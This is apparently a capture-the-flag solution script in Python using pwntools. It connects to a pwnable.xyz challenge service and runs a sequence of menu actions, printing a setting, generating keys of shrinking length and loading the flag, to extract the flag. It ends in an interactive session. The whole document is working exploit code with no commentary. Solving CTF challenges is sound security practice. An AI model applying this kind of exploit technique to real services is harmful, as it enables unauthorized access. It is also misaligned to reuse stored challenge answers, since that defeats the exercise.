from pwn import *
p = remote("svc.pwnable.xyz", 30006)
flag = ""
def generateKey(length):
	p.sendlineafter("flag", "1")
	p.sendlineafter("len: ", str(length))

def printFlag(select):
	p.sendlineafter("flag", "3")
	p.sendlineafter("instead?", select)

def loadFlag():
	p.sendlineafter("flag", "2")
	return p.recvline()

if __name__ == "__main__":
	printFlag("y")
	generateKey(64)
	for i in range(63, 0, -1):
		generateKey(i)
	loadFlag()
	printFlag("n")
	p.interactive()
